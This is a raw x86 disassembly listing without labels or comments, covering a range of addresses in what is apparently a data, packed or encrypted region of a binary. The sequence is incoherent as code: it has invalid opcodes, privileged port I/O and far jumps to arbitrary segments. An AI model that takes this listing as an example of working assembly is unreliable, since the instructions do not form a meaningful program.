  414e4d:	lea    ecx,[edx+0x1b]
  414e50:	mov    dl,0x84
  414e52:	mov    WORD PTR [eax+0x59],cs
  414e55:	or     al,0x2b
  414e57:	mov    edx,0x5c40788e
  414e5c:	push   ds
  414e5d:	in     al,0x68
  414e5f:	mov    eax,ds:0x2f50fa31
  414e64:	test   al,0xd5
  414e66:	fs test al,0x89
  414e69:	dec    ebp
  414e6a:	push   0x6e
  414e6c:	jno    0x414e2c
  414e6e:	add    al,0x79
  414e70:	mov    al,0x8a
  414e72:	jbe    0x414e22
  414e74:	jne    0x414ecc
  414e76:	xor    DWORD PTR [ecx-0x4a47d6cf],0x52
  414e7d:	inc    ebx
  414e7e:	sub    al,0x66
  414e80:	or     BYTE PTR gs:[edi],dh
  414e83:	or     DWORD PTR [ecx-0x17f6ff5a],ebp
  414e89:	cwde   
  414e8a:	add    edi,DWORD PTR [esi-0x20]
  414e8d:	pop    edi
  414e8e:	enter  0xce02,0x4e
  414e92:	sbb    al,0xfc
  414e94:	arpl   WORD PTR ds:0x3cf2ffcb,di
  414e9a:	das    
  414e9b:	mov    eax,0x8419e51
  414ea0:	sti    
  414ea1:	adc    bl,BYTE PTR [esp+edx*4]
  414ea4:	pop    esp
  414ea5:	je     0x414e8b
  414ea7:	call   FWORD PTR [edi]
  414ea9:	sbb    DWORD PTR [esi],esi
  414eab:	adc    ah,dl
  414ead:	mov    ecx,0x5520464e
  414eb2:	mov    ds:0x3cf8f5e0,eax
  414eb7:	adc    ah,BYTE PTR [ecx]
  414eb9:	fucomi st,st(1)
  414ebb:	int3   
  414ebc:	add    dh,ch
  414ebe:	and    al,0x50
  414ec0:	sub    BYTE PTR [esi+0x59],bh
  414ec3:	dec    edx
  414ec4:	je     0x414f06
  414ec6:	push   0x44
  414ec8:	loopne 0x414ed0
  414eca:	push   esp
  414ecb:	inc    ebx
  414ecc:	add    eax,0x47faffe6
  414ed1:	mov    ah,0xa2
  414ed3:	in     al,0x3d
  414ed5:	xor    BYTE PTR [eax-0x5a704b6f],al
  414edb:	faddp  st(7),st
  414edd:	ror    BYTE PTR [ebp+0x75],0x9
  414ee1:	ret    0x2da1
  414ee4:	add    al,0xf6
  414ee6:	pop    ds
  414ee7:	mov    edx,0x98a291db
  414eec:	and    ebx,DWORD PTR [edi]
  414eee:	je     0x414e8b
  414ef0:	adc    ebx,DWORD PTR ds:0x9b4ce0b7
  414ef6:	popf   
  414ef7:	in     eax,dx
  414ef8:	cli    
  414ef9:	ss mov cl,0x55
  414efc:	or     al,0xd0
  414efe:	ins    BYTE PTR es:[edi],dx
  414eff:	jmp    FWORD PTR [eax+eax*1]
  414f02:	je     0x414f4e
  414f04:	adc    DWORD PTR [ebx-0x329c4d0e],esp
  414f0a:	fwait
  414f0b:	inc    ebx
  414f0c:	aas    
  414f0d:	out    dx,eax
  414f0e:	xor    BYTE PTR [edx],al
  414f10:	out    dx,eax
  414f11:	lods   eax,DWORD PTR ds:[esi]
  414f12:	ins    DWORD PTR es:[edi],dx
  414f13:	xor    edi,esp
  414f15:	sub    bl,BYTE PTR [eax+0x34]
  414f18:	test   DWORD PTR [esi+eax*4],ecx
  414f1b:	jg     0x414f01
  414f1d:	jl     0x414ec6
  414f1f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414f20:	enter  0xeafe,0x89
  414f24:	push   ds
  414f25:	in     eax,dx
  414f26:	imul   ecx,ecx,0xb2cf5aa1
  414f2c:	cmp    esi,0x9420ce59
  414f32:	jge    0x414f16
  414f34:	jp     0x414f08
  414f36:	inc    esi
  414f37:	mov    ss,WORD PTR [ecx+0x4]
  414f3a:	mov    dl,0x78
  414f3c:	mov    bh,0xe5
  414f3e:	push   esi
  414f3f:	rol    eax,1
  414f41:	jge    0x414f8d
  414f43:	pop    esp
  414f44:	mov    ebx,0x3f2e2b00
  414f49:	loope  0x414ef0
  414f4b:	daa    
  414f4c:	gs cmps DWORD PTR gs:[esi],DWORD PTR es:[edi]
  414f4f:	mov    ebx,0x173f9a78
  414f54:	ret    
  414f55:	(bad)  [ebx+0x7c530bb5]
  414f5b:	inc    edx
  414f5c:	dec    esi
  414f5d:	sub    ebx,DWORD PTR [ecx+0x2b]
  414f60:	jmp    0x3f60:0x78917f3f
  414f67:	in     al,dx
  414f68:	es sub eax,0x3e412dd2
  414f6e:	cmp    DWORD PTR [ecx+0x10cef6d7],eax
  414f74:	sub    dl,BYTE PTR [ebx+0x63]
  414f77:	pop    eax
  414f78:	push   ss
  414f79:	pop    edx
  414f7a:	jecxz  0x414f6f
  414f7c:	push   ss
  414f7d:	aad    0x6a
  414f7f:	imul   ebx,DWORD PTR [edx-0x44],0xffffff83
  414f83:	push   edx
  414f84:	int3   
  414f85:	or     DWORD PTR [edx-0x6f5c169e],ebx
  414f8b:	and    al,0xff
  414f8d:	mov    edx,0x7ac80256
  414f92:	mov    dh,0xf6
  414f94:	cs and al,0x68
  414f97:	jle    0x414fce
  414f99:	push   eax
  414f9a:	or     eax,0xbf7c8863
  414f9f:	add    DWORD PTR [edi+esi*4+0xf],esi
  414fa3:	mov    ecx,0xb99c05d6
  414fa8:	shr    ch,cl
  414faa:	std    
  414fab:	aaa    
  414fac:	(bad)  
  414fae:	(bad)
  414fb1:	dec    ebx
  414fb2:	adc    esi,ecx
  414fb4:	jns    0x415001
  414fb6:	xor    BYTE PTR [edx-0x32],ch
  414fb9:	adc    bl,BYTE PTR [eax]
  414fbb:	pop    esi
  414fbc:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  414fbe:	(bad)  
  414fbf:	xor    al,0x17
  414fc1:	mov    ebx,DWORD PTR [edi+0x326600a7]
  414fc7:	mov    eax,ds:0xbd9827b4
  414fcc:	dec    eax
  414fcd:	jg     0x415034
  414fcf:	call   0x7252:0x90bbbb1c
  414fd6:	fs lahf 
  414fd8:	xchg   ebp,eax
  414fd9:	mov    ecx,0x2bd2348c
  414fde:	sub    eax,0x44b996d
  414fe3:	inc    eax
  414fe4:	dec    edx
  414fe5:	fisttp DWORD PTR [ebp-0x2a644cda]
  414feb:	mov    ah,0x39
  414fed:	mov    esp,0x300edfe8
  414ff2:	popf   
  414ff3:	nop
  414ff4:	pop    edi
  414ff5:	gs (bad) 
  414ff7:	xor    eax,0xe47bd664
  414ffc:	sahf   
  414ffd:	add    bh,BYTE PTR [edx-0x56f0d428]
  415003:	inc    esi
  415004:	mov    DWORD PTR [edx],ebx
  415006:	push   edi
  415007:	std    
  415008:	mov    bl,0x52
  41500a:	dec    edx
  41500b:	jl     0x41508b
  41500d:	arpl   WORD PTR [edi],sp
  41500f:	and    BYTE PTR [ebx],0x73
  415012:	sbb    eax,0xb6cb187e
  415017:	or     eax,0x4855f2d8
  41501c:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  41501e:	mov    BYTE PTR [edx-0x5f],cl
  415021:	dec    edi
  415022:	repnz dec ebp
  415024:	xchg   ebx,eax
  415025:	arpl   sp,ax
  415027:	mov    eax,ebx
  415029:	sub    ebx,DWORD PTR [eax+0xd]
  41502c:	addr16 out 0xac,eax
  41502f:	sub    ah,ch
  415031:	add    BYTE PTR [edx],ah
  415033:	stos   BYTE PTR es:[edi],al
  415034:	jp     0x4150a2
  415036:	mov    bl,0xbd
  415038:	push   esi
  415039:	ret    
  41503a:	les    esp,FWORD PTR [eax-0x4a]
  41503d:	hlt    
  41503e:	pop    ss
  41503f:	jl     0x415022
  415041:	addr16 jno 0x41500f
  415044:	adc    al,0x82
  415046:	sub    eax,0x8a3d0989
  41504b:	imul   esp,edi,0x7a
  41504e:	dec    ebx
  41504f:	mov    dh,0xc2
  415051:	fistp  QWORD PTR [ecx+esi*8+0x64f37bf7]
  415058:	nop
  415059:	mov    al,ds:0x64dfbdd5
  41505e:	(bad)  
  41505f:	cwde   
  415060:	dec    esp
  415061:	enter  0xe717,0xd7
  415065:	shl    DWORD PTR [ebx],0x98
  415068:	(bad)  
  415069:	lods   eax,DWORD PTR ds:[esi]
  41506a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41506b:	rcl    ecx,1
  41506d:	xlat   BYTE PTR ds:[ebx]
  41506e:	outs   dx,BYTE PTR ds:[esi]
  41506f:	mov    esi,0xc4272728
  415074:	pop    esp
  415075:	outs   dx,DWORD PTR ds:[esi]
  415076:	mov    WORD PTR [edx+ecx*1+0xa],ds
  41507a:	push   ds
  41507b:	(bad)  
  41507c:	out    0xa1,eax
  41507e:	push   0x7ce59d00
  415083:	ficom  WORD PTR [eax+0x32]
  415086:	mov    bh,0x3d
  415088:	jle    0x415087
  41508a:	xor    esi,DWORD PTR [esi-0x11186a4f]
  415090:	mov    esp,0x5f9bf27b
  415095:	shl    DWORD PTR [edx+0x6b],cl
  415098:	div    BYTE PTR [esp+ecx*2]
  41509b:	(bad)  
  41509c:	cmp    DWORD PTR [eax],ebp
  41509e:	ficom  DWORD PTR [eax]
  4150a0:	add    bh,BYTE PTR [eax+0x5b]
  4150a3:	mov    eax,ds:0x91af2afb
  4150a8:	sub    al,0xc3
  4150aa:	mov    esi,0x640fa127
  4150af:	push   ds
  4150b0:	ins    BYTE PTR es:[edi],dx
  4150b1:	mov    dh,0xfa
  4150b3:	mov    WORD PTR [eax],cs
  4150b5:	or     ebp,DWORD PTR [edx+0x2a]
  4150b8:	sub    eax,0x86c3de4
  4150bd:	push   ebp
  4150be:	(bad)  
  4150bf:	clc    
  4150c0:	(bad)  
  4150c1:	fistp  WORD PTR [esp+esi*4+0x2f]
  4150c5:	mov    edi,DWORD PTR [esi]
  4150c7:	mov    bh,0x2
  4150c9:	cmp    BYTE PTR [esi+0x21],bh
  4150cc:	jge    0x415100
  4150ce:	(bad)  
  4150cf:	xor    ch,ch
  4150d1:	dec    esp
  4150d2:	repnz mov bl,BYTE PTR [edx]
  4150d5:	mov    ds,esi
  4150d7:	das    
  4150d8:	int3   
  4150d9:	push   edi
  4150da:	jecxz  0x4150e9
  4150dc:	jp     0x4150ab
  4150de:	adc    al,0x38
  4150e0:	mov    ds:0x8297b4a9,al
  4150e5:	retf   0x9977
  4150e8:	xchg   DWORD PTR [edi],ebp
  4150ea:	dec    edi
  4150eb:	inc    esp
  4150ec:	aad    0x12
  4150ee:	mov    ebp,0x63d8cf84
  4150f3:	push   edx
  4150f4:	mov    al,ds:0xdb5260a0
  4150f9:	pop    ebx
  4150fa:	(bad)  
  4150fb:	dec    eax
  4150fc:	jmp    0x415136
  4150fe:	in     al,dx
  4150ff:	jg     0x41515e
  415101:	cs in  al,dx
  415103:	mov    dh,0x5c
  415105:	ffree  st(5)
  415107:	mov    DWORD PTR [ecx-0x2afec7a0],ecx
  41510d:	loope  0x415102
  41510f:	sar    esp,cl
  415111:	cmc    
  415112:	lods   al,BYTE PTR ds:[esi]
  415113:	inc    ebp
  415114:	into   
  415115:	jbe    0x4150fa
  415117:	stc    
  415118:	call   0xffe9:0xef079409
  41511f:	xor    BYTE PTR [edi+edx*1-0x4b3b8893],dh
  415126:	(bad)
  415129:	es inc edi
  41512b:	icebp  
  41512c:	dec    esp
  41512d:	pop    ebx
  41512e:	mov    WORD PTR [edi],fs
  415130:	dec    ebp
  415131:	repnz add esi,esi
  415134:	arpl   WORD PTR [ecx+0x51],bp
  415137:	outs   dx,DWORD PTR ds:[esi]
  415138:	fisubr DWORD PTR [eax-0x59]
  41513b:	clc    
  41513c:	mov    BYTE PTR [edx+ebx*2-0x12],0x73
  415141:	fwait
  415142:	or     al,0x59
  415144:	or     al,0x75
  415146:	pop    ss
  415147:	rcl    bl,1
  415149:	or     esi,eax
  41514b:	pop    es
  41514c:	mov    cl,0x1e
  41514e:	mov    bh,0x17
  415150:	out    dx,eax
  415151:	ss cmp al,0xe4
  415154:	jg     0x4150ec
  415156:	cmp    al,bl
  415158:	push   ds
  415159:	iret   
  41515a:	ror    edx,0x75
  41515d:	pop    ss
  41515e:	pop    ebx
  41515f:	or     dh,BYTE PTR [ecx-0x5a82d704]
  415165:	mov    al,0x39
  415167:	cmp    BYTE PTR [edx+ebx*8-0x1f0a579e],0x92
  41516f:	repnz mov ebx,0xda38f70
  415175:	add    eax,DWORD PTR [ebp-0x78]
  415178:	outs   dx,DWORD PTR ds:[esi]
  415179:	sbb    eax,0x9c76faae
  41517e:	aaa    
  41517f:	dec    edx
  415180:	mov    cl,BYTE PTR [ebp+0x11941abd]
  415186:	xor    al,ah
  415188:	jmp    0x5699:0x13e8176c
  41518f:	fst    DWORD PTR [ebx-0x51]
  415192:	xchg   BYTE PTR [ecx],cl
  415194:	out    dx,al
  415195:	cld    
  415196:	in     al,0xa7
  415198:	dec    edi
  415199:	mov    WORD PTR [ecx+0x305fd5a],cs
  41519f:	mov    ebx,0x236ab682
  4151a4:	enter  0xf1e1,0xa3
  4151a8:	pop    edx
  4151a9:	out    dx,al
  4151aa:	push   ecx
  4151ab:	jmp    0x415183
  4151ad:	in     al,dx
  4151ae:	add    ebp,DWORD PTR [ecx-0x50b6ee33]
  4151b4:	ins    DWORD PTR es:[edi],dx
  4151b5:	push   ebp
  4151b6:	jl     0x4151c7
  4151b8:	cli    
  4151b9:	int    0xbc
  4151bb:	adc    ah,BYTE PTR ss:[esi]
  4151be:	loope  0x4151de
  4151c0:	xchg   DWORD PTR [ecx],edi
  4151c2:	jge    0x415155
  4151c4:	or     al,0xd8
  4151c6:	jmp    0x364a26f9
  4151cb:	lods   al,BYTE PTR ds:[esi]
  4151cc:	xor    ebp,DWORD PTR [esi-0x25109dd0]
  4151d2:	std    
  4151d3:	dec    ebp
  4151d4:	jnp    0x41523a
  4151d6:	or     ebp,DWORD PTR [ebp-0x399837a7]
  4151dc:	cmp    DWORD PTR [eax],eax
  4151de:	enter  0xb6af,0x53
  4151e2:	dec    esp
  4151e3:	in     eax,0x27
  4151e5:	push   cs
  4151e6:	out    0x86,al
  4151e8:	not    DWORD PTR [eax-0x14]
  4151eb:	xor    ecx,DWORD PTR [esi-0x2b23a17e]
  4151f1:	data16 xchg BYTE PTR [edi+eax*4+0x4686e9fa],bh
  4151f9:	xor    eax,DWORD PTR ds:0x4e6c1010
  4151ff:	rcr    BYTE PTR [edx-0x468a2d04],cl
  415205:	xchg   edi,eax
  415206:	gs pop ecx
  415208:	ja     0x4151b7
  41520a:	sbb    eax,0xeda2f735
  41520f:	adc    cl,BYTE PTR [edx+0x15]
  415212:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415213:	add    BYTE PTR [eax-0x2f21e4d5],ch
  415219:	xor    ecx,esi
  41521b:	lods   eax,DWORD PTR ds:[esi]
  41521c:	out    dx,eax
  41521d:	inc    ebp
  41521e:	(bad)  
  415220:	push   ds
  415221:	jp     0x415279
  415223:	add    BYTE PTR [esi],bl
  415225:	inc    edx
  415226:	mov    ecx,0x933647ac
  41522b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41522c:	pop    ebp
  41522d:	int3   
  41522e:	or     DWORD PTR [ecx],eax
  415230:	ss das 
  415232:	bound  ecx,QWORD PTR [esp+edi*4]
  415235:	inc    DWORD PTR [ecx]
  415237:	(bad)  
  415238:	push   eax
  415239:	push   esp
  41523a:	push   edi
  41523b:	mov    edx,0xdad619ba
  415240:	(bad)  
  415241:	aad    0x1c
  415243:	xchg   DWORD PTR [eax-0x5e8efbff],ebx
  415249:	push   edx
  41524a:	mov    esp,esp
  41524c:	pop    edx
  41524d:	inc    edi
  41524e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41524f:	nop
  415250:	adc    BYTE PTR [ebx-0x72806d7f],dh
  415256:	xor    esi,DWORD PTR [ebp+0x33]
  415259:	test   DWORD PTR [edi+0x7f],ebx
  41525c:	inc    ebp
  41525d:	jnp    0x415252
  41525f:	mov    al,0xa6
  415261:	loopne 0x415296
  415263:	cmp    BYTE PTR [eax+0x6e9705bf],bh
  415269:	sub    DWORD PTR gs:[edx+0x48f83362],0x17
  415271:	scas   al,BYTE PTR es:[edi]
  415272:	outs   dx,DWORD PTR ds:[esi]
  415273:	icebp  
  415274:	and    cl,BYTE PTR [ebx+0x54dd3d04]
  41527a:	cmp    dh,dl
  41527c:	out    dx,eax
  41527d:	int    0x7d
  41527f:	jp     0x41522d
  415281:	dec    edx
  415282:	mov    esi,0x7f47b0e1
  415287:	popa   
  415288:	inc    edi
  415289:	pop    edi
  41528a:	fnstcw WORD PTR [edx]
  41528c:	sbb    eax,0xc8c6736a
  415291:	mov    eax,ds:0x8006a135
  415296:	out    dx,al
  415297:	ret    0x1889
  41529a:	push   cs
  41529b:	xchg   edx,eax
  41529c:	mov    esi,0x7f9aff4b
  4152a1:	call   0xf688:0x456b2683
  4152a8:	out    dx,eax
  4152a9:	stos   BYTE PTR es:[edi],al
  4152aa:	lea    esp,[ecx+0x5f]
  4152ad:	inc    eax
  4152ae:	lahf   
  4152af:	inc    ebx
  4152b0:	daa    
  4152b1:	add    esp,ebp
  4152b3:	inc    ebx
  4152b4:	mov    ch,0x3b
  4152b6:	das    
  4152b7:	test   DWORD PTR [eax+0x2866ae79],ebp
  4152bd:	lock test BYTE PTR [ecx-0x31],bl
  4152c1:	aam    0x1
  4152c3:	and    ah,dh
  4152c5:	jg     0x4152b6
  4152c7:	fcom   QWORD PTR [edx-0x13]
  4152ca:	fs enter 0xc148,0x38
  4152cf:	je     0x41529c
  4152d1:	stos   BYTE PTR es:[edi],al
  4152d2:	icebp  
  4152d3:	push   cs
  4152d4:	mov    bl,0x90
  4152d6:	ds (bad) 
  4152d8:	jmp    0x5dbc6c10
  4152dd:	mov    ah,0x13
  4152df:	je     0x4152d2
  4152e1:	mov    DWORD PTR [edx+0x2d],ebx
  4152e4:	popa   
  4152e5:	and    dl,BYTE PTR [ebx+0x19]
  4152e8:	jl     0x415300
  4152ea:	cmp    BYTE PTR [edx+0x26241e8f],0x8c
  4152f1:	out    dx,eax
  4152f2:	add    ecx,0xa8b0fbb8
  4152f8:	jge    0x4152b4
  4152fa:	push   ebp
  4152fb:	mov    al,ds:0x95293f64
  415300:	out    0xa8,eax
  415302:	mul    BYTE PTR [eax]
  415304:	sub    dh,BYTE PTR ds:0xea2654a4
  41530a:	ret    0x2cb6
  41530d:	ror    DWORD PTR [edi+0x66f684ad],cl
  415313:	dec    esi
  415314:	mov    dl,0x3d
  415316:	adc    al,0xfa
  415318:	lock pop ss
  41531a:	rcl    DWORD PTR [ebp+edi*2-0x3e],1
  41531e:	push   edi
  41531f:	cmp    eax,0x7bccb309
  415324:	xor    eax,0x4f3ecd27
  415329:	sbb    DWORD PTR es:0x1a90f8,0x669925f0
  415334:	dec    ebp
  415335:	sub    al,0xc2
  415337:	gs loopne 0x415354
  41533a:	out    dx,al
  41533b:	ret    0x7396
  41533e:	pop    ebp
  41533f:	xor    DWORD PTR [ebx-0x6ce15db7],ebp
  415345:	vpshad ymm5,[ebp-0x8],xmm1
  41534b:	or     al,BYTE PTR [esi+eax*1-0x2a43327f]
  415352:	xor    al,0x9
  415354:	popf   
  415355:	bound  ebp,QWORD PTR [edi]
  415357:	outs   dx,DWORD PTR cs:[esi]
  415359:	cmpxchg DWORD PTR gs:[edx+edi*2+0x459905c0],ecx
  415362:	and    BYTE PTR [ebx+0x7ccb1f80],cl
  415368:	iret   
  415369:	outs   dx,DWORD PTR ds:[esi]
  41536a:	(bad)  
  41536b:	retf   
  41536c:	add    eax,0xd00cf664
  415371:	pop    edi
  415372:	cli    
  415373:	sar    esp,1
  415375:	shl    DWORD PTR [eax],0x75
  415378:	hlt    
  415379:	mov    al,ds:0x7ca38882
  41537e:	ficomp WORD PTR [ecx-0x2375a39f]
  415384:	and    DWORD PTR [ebp+0x373366f],ecx
  41538a:	nop
  41538b:	call   0x244a:0x29508ae8
  415392:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415393:	fisubr DWORD PTR [ebx+eiz*4+0x49]
  415397:	or     BYTE PTR [ecx+eax*2],bl
  41539a:	lds    ebp,FWORD PTR [ecx-0x5f]
  41539d:	inc    eax
  41539e:	push   ebp
  41539f:	jle    0x415338
  4153a1:	dec    edi
  4153a2:	push   0x2d
  4153a4:	(bad)  
  4153a5:	in     eax,dx
  4153a6:	cli    
  4153a7:	dec    esi
  4153a8:	fnstsw WORD PTR [ecx-0xfc6866a]
  4153ae:	cld    
  4153af:	pop    edi
  4153b0:	outs   dx,BYTE PTR ds:[esi]
  4153b1:	shld   DWORD PTR [edx-0x79698bfd],eax,0x72
  4153b9:	iret   
  4153ba:	dec    ebp
  4153bb:	test   al,0x1b
  4153bd:	iret   
  4153be:	cs push cs
  4153c0:	adc    al,0x18
  4153c2:	sbb    eax,0x31d5435a
  4153c7:	les    eax,FWORD PTR [edi]
  4153c9:	sub    al,0x86
  4153cb:	jno    0x4153f3
  4153cd:	or     BYTE PTR [eax+0x58],dl
  4153d0:	out    0x19,eax
  4153d2:	aas    
  4153d3:	fstp   TBYTE PTR [edx-0x3]
  4153d6:	xchg   edi,eax
  4153d7:	rol    DWORD PTR [edx-0xe556b8e],1
  4153dd:	pop    esp
  4153de:	scas   eax,DWORD PTR es:[edi]
  4153df:	or     eax,0x29643f60
  4153e4:	ds iret 
  4153e6:	test   eax,ecx
  4153e8:	sub    al,0xd3
  4153ea:	imul   ecx,DWORD PTR [esi],0x39cf4638
  4153f0:	jae    0x4153d4
  4153f2:	loope  0x4153ad
  4153f4:	and    eax,DWORD PTR [esi-0x3b9bbd7f]
  4153fa:	loopne 0x4153fe
  4153fc:	hlt    
  4153fd:	sub    bl,cl
  4153ff:	repz push edx
  415401:	mov    BYTE PTR [ebp+0x1b3bc498],dh
  415407:	xchg   esp,eax
  415408:	pop    edx
  415409:	sbb    dl,BYTE PTR [ebp+0x21e2e2c0]
  41540f:	xor    al,0xc4
  415411:	jg     0x415469
  415413:	pop    edx
  415414:	push   es
  415415:	pop    esi
  415416:	push   ebp
  415417:	les    eax,FWORD PTR [eax+ebx*1]
  41541a:	sbb    al,0x4d
  41541c:	mov    WORD PTR [ebp+0x7ccbbf8a],cs
  415422:	int3   
  415423:	mov    ebx,0xa080c2f4
  415428:	sub    DWORD PTR [ebx+0x5],esi
  41542b:	push   edi
  41542c:	rcr    DWORD PTR [edi-0x6f],1
  41542f:	sbb    eax,0xce6e2c65
  415434:	jl     0x41545a
  415436:	shl    dh,cl
  415438:	mov    cl,0x3
  41543a:	adc    esp,esi
  41543c:	add    BYTE PTR [edx+0x12c97cb1],ch
  415442:	sbb    bh,cl
  415444:	push   es
  415445:	jg     0x41542a
  415447:	sbb    eax,0x77f80fed
  41544c:	jp     0x4154ad
  41544e:	ds stos DWORD PTR es:[edi],eax
  415450:	stc    
  415451:	fmul   QWORD PTR [eax-0x6fbbd7fd]
  415457:	dec    eax
  415458:	jmp    0x96b1:0x280e8057
  41545f:	sub    DWORD PTR [edx],ecx
  415461:	mov    bh,0xd
  415463:	push   ecx
  415464:	pushf  
  415465:	lea    esi,[ecx]
  415467:	mov    ch,0x37
  415469:	jns    0x415412
  41546b:	mov    ch,0x41
  41546d:	xchg   edx,eax
  41546e:	jb     0x415451
  415470:	inc    edi
  415471:	mov    ch,0xb5
  415473:	pop    es
  415474:	stc    
  415475:	cwde   
  415476:	es je  0x41545c
  415479:	xchg   ah,ch
  41547b:	rcl    BYTE PTR [eax],cl
  41547d:	jecxz  0x4154fa
  41547f:	inc    ebp
  415480:	dec    esi
  415481:	mov    ebp,0x567655b1
  415486:	mov    ebp,0x45b44509
  41548b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41548c:	inc    esi
  41548d:	aad    0x4
  41548f:	jg     0x41541d
  415491:	or     bh,BYTE PTR [edi+ebp*4+0x70]
  415495:	pop    ss
  415496:	fwait
  415497:	daa    
  415498:	mov    bh,0x8a
  41549a:	ret    0xcc16
  41549d:	jnp    0x4154b2
  41549f:	test   eax,0xd5addd53
  4154a4:	cmp    edx,DWORD PTR ds:0x4e9a945d
  4154aa:	in     eax,dx
  4154ab:	pop    esi
  4154ac:	sbb    eax,0xe451f3b3
  4154b1:	push   es
  4154b2:	adc    al,ch
  4154b4:	cwde   
  4154b5:	leave  
  4154b6:	arpl   si,dx
  4154b8:	cwde   
  4154b9:	(bad)  
  4154ba:	cmp    ebp,esp
  4154bc:	fild   WORD PTR [ebx]
  4154be:	cmp    BYTE PTR [eax-0x613c10fe],bh
  4154c4:	xchg   ecx,eax
  4154c5:	xchg   esi,eax
  4154c6:	xor    bl,BYTE PTR [ebx+0x3809bb9]
  4154cc:	add    bh,BYTE PTR [ecx]
  4154ce:	imul   ecx,DWORD PTR [esi],0xacda46a2
  4154d4:	push   es
  4154d5:	call   0x4d1820ac
  4154da:	cmc    
  4154db:	mov    edi,0xca4d1c9a
  4154e0:	jg     0x4154e3
  4154e2:	test   ebx,edx
  4154e4:	test   BYTE PTR [ecx-0x80],ah
  4154e7:	in     al,0x1c
  4154e9:	sub    ah,BYTE PTR ds:0x5e0db3c8
  4154ef:	fwait
  4154f0:	leave  
  4154f1:	sub    ebp,DWORD PTR [ebx+0x25]
  4154f4:	push   ss
  4154f5:	shr    BYTE PTR [eax+0x68905f22],cl
  4154fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4154fc:	mov    ch,al
  4154fe:	sub    eax,0x709d9154
  415503:	jno    0x41556f
  415505:	xchg   esp,eax
  415507:	stos   DWORD PTR es:[edi],eax
  415508:	repz dec ebx
  41550a:	inc    esp
  41550b:	mov    dh,0xaf
  41550d:	jp     0x4154a7
  41550f:	push   esi
  415510:	jecxz  0x415522
  415512:	or     BYTE PTR [eax],0x5f
  415515:	inc    edx
  415516:	fdiv   QWORD PTR [eax]
  415518:	xchg   ebp,eax
  415519:	jg     0x4154dc
  41551b:	sahf   
  41551c:	retf   
  41551d:	push   ds
  41551e:	(bad)  
  41551f:	test   BYTE PTR [ecx+0x54],0x4
  415523:	cmp    BYTE PTR [ecx-0x71],ch
  415526:	cmp    ebx,ebx
  415528:	imul   edx,DWORD PTR ds:0xd6760817,0xffffffc7
  41552f:	sbb    eax,0x8c437aec
  415534:	std    
  415535:	cmp    al,0xa0
  415537:	inc    ecx
  415538:	fild   QWORD PTR [edx-0x1f]
  41553b:	hlt    
  41553c:	(bad)  
  41553d:	aad    0xfb
  41553f:	jl     0x4155a5
  415541:	cld    
  415542:	xor    eax,0x6804d9a5
  415547:	dec    ebx
  415548:	cmp    eax,0x5d7fbe98
  41554d:	fimul  DWORD PTR [eax-0x2e]
  415550:	xor    eax,0x5d39b546
  415555:	retf   0xceb2
  415558:	push   cs
  415559:	(bad)  
  41555a:	mov    ecx,0xc972fe1c
  41555f:	xchg   esi,eax
  415560:	in     al,dx
  415561:	xchg   BYTE PTR [esp+eax*1-0x2f],bl
  415565:	ror    DWORD PTR [esi],0xc4
  415568:	pop    ecx
  415569:	gs push edi
  41556b:	icebp  
  41556c:	ret    0x58d4
  41556f:	or     DWORD PTR [eax-0x7225712d],0x4e838baa
  415579:	ret    0xb46e
  41557c:	lahf   
  41557d:	in     al,0x20
  41557f:	and    dh,ah
  415581:	loop   0x4155e7
  415583:	das    
  415584:	or     edi,0xf88b649f
  41558a:	ss sbb cl,al
  41558d:	inc    esi
  41558e:	int    0xcc
  415590:	push   edi
  415591:	mov    al,0x60
  415593:	mov    DWORD PTR [eax],edi
  415595:	sub    al,0x1f
  415597:	adc    DWORD PTR [esi],ebx
  415599:	push   esp
  41559a:	or     BYTE PTR [ebx+esi*1+0x31],al
  41559e:	push   edi
  41559f:	adc    eax,0xa0f07e8a
  4155a4:	or     edi,esi
  4155a6:	dec    ecx
  4155a7:	xchg   BYTE PTR [eax-0x19368ae3],dh
  4155ad:	push   esi
  4155ae:	adc    eax,0x964ef6ab
  4155b3:	push   ebx
  4155b4:	lahf   
  4155b5:	and    DWORD PTR ds:0xe4bc8bad,esi
  4155bb:	mov    ebp,0xb03451a0
  4155c0:	ficomp WORD PTR [ebx-0x3a]
  4155c3:	(bad)  
  4155c4:	mov    ebx,0xe5e9ef9c
  4155c9:	lea    esp,[eax]
  4155cb:	rcr    BYTE PTR [ecx+0x7b],1
  4155ce:	add    BYTE PTR [ebx+0xb1e0506],bh
  4155d4:	aaa    
  4155d5:	cmp    esi,DWORD PTR [ebx-0x72b7ab6]
  4155db:	push   ds
  4155dc:	inc    eax
  4155dd:	xlat   BYTE PTR ds:[ebx]
  4155de:	dec    esp
  4155df:	lods   eax,DWORD PTR ds:[esi]
  4155e0:	cld    
  4155e1:	or     ah,ah
  4155e3:	sbb    ch,cl
  4155e5:	mov    eax,0x740c66e7
  4155ea:	sbb    eax,0xf0ed4e45
  4155ef:	mov    edx,0xc58633ef
  4155f4:	popf   
  4155f5:	or     BYTE PTR [edx-0xc7838b2],bl
  4155fb:	shl    BYTE PTR [edx],1
  4155fd:	leave  
  4155fe:	dec    ebp
  4155ff:	push   edi
  415600:	push   ecx
  415601:	gs (bad) 
  415603:	rdtsc  
  415605:	or     eax,0xf1c469d2
  41560a:	call   0x931002d9
  41560f:	outs   dx,DWORD PTR ds:[esi]
  415610:	xlat   BYTE PTR ds:[ebx]
  415611:	out    dx,al
  415612:	push   0xffffffa3
  415614:	pop    ebp
  415615:	mov    gs,WORD PTR [eax+0x3b]
  415618:	scas   eax,DWORD PTR es:[edi]
  415619:	dec    esi
  41561a:	sbb    ah,cl
  41561c:	mov    esi,DWORD PTR [edx+0x1e4311c3]
  415622:	fst    QWORD PTR ds:0x877d4883
  415628:	nop
  415629:	outs   dx,BYTE PTR ds:[esi]
  41562a:	cli    
  41562b:	and    ebx,0xcff02b15
  415631:	xlat   BYTE PTR ds:[ebx]
  415632:	repz aas 
  415634:	in     eax,0x90
